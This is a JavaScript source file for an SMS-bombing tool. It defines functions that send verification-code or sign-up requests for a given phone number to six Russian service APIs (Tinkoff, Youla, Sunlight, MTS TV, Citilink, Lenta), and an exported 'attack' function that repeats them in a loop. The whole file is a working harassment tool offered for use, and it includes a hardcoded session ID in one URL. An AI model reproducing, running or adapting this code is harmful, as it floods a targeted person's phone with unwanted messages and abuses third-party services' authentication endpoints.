//requirements
const fetch = require('node-fetch')
const FormData = require('form-data')
//consts
const delay = 5000
const disable = 10000

function b_tinkoff(number){
    const url = 'https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=sbIfQhla77mj4sfiwabVG6JmXuadPWUs.m1-prod-api33&wuid=f70b790d59454f83b9f9e86642d88e45'
    const payload = new FormData()
    payload.append('phone', number)
    fetch(url, {
        method: 'post',
        body: payload
    })
        .then(r => r.json())
        .then(r => console.log(r))
        .catch(e => console.log(e))
}

function youla(number){
    const url = ' https://youla.ru/web-api/auth/request_code'
    const payload = {
        phone: number
    }
    
    fetch(url, {
        method: 'post', 
        body: JSON.stringify(payload),
        headers:{'Content-Type': 'application/json'}
    })
        .then(r => r.json())
        .then(r => console.log(r))
        .catch(e => console.log(e))
}

function sunlight(number){
    const url = 'https://api.sunlight.net/v3/customers/authorization/'
    const payload = {
        phone: number
    }
    
    fetch(url, {
        method: 'post', 
        body: JSON.stringify(payload),
        headers:{'Content-Type': 'application/json'}
    })
        .then(r => r.json())
        .then(r => console.log(r))
        .catch(e => console.log(e))
}

function mtstv(number){
    const url = 'https://api.mtstv.ru/v1/users'
    const payload = {
        'msisdn': number
    }
    
    fetch(url, {
        method: 'post', 
        body: JSON.stringify(payload),
        headers:{'Content-Type': 'application/json'}
    })
        .then(r => r.json())
        .then(r => console.log(r))
        .catch(e => console.log(e))
}

function citilink(number){
    const url = `https://www.citilink.ru/registration/confirm/phone/${number}/`
    fetch(url, {
        method:'post',
        headers:{'Content-Type': 'application/json'}
    })
        .then(r => r.json())
        .then(r => console.log(r))
        .catch(e => console.log(e))
}

function lenta(number){
    const url = 'https://lenta.com/api/v1/authentication/requestValidationCode'
    const payload = {
        phone: number
    }
    
    fetch(url, {
        method: 'post', 
        body: JSON.stringify(payload),
        headers:{'Content-Type': 'application/json'}
    })
        .then(r => r.json())
        .then(r => console.log(r))
        .catch(e => console.log(e))
}

this.attack =  function attack(number, count) {
    for(let i = 0; i < count; i++){
        b_tinkoff(number)
        youla(number)
        sunlight(number)
        mtstv(number)
        citilink(number)
        lenta(number)
        //await setInterval(2000)
    }
}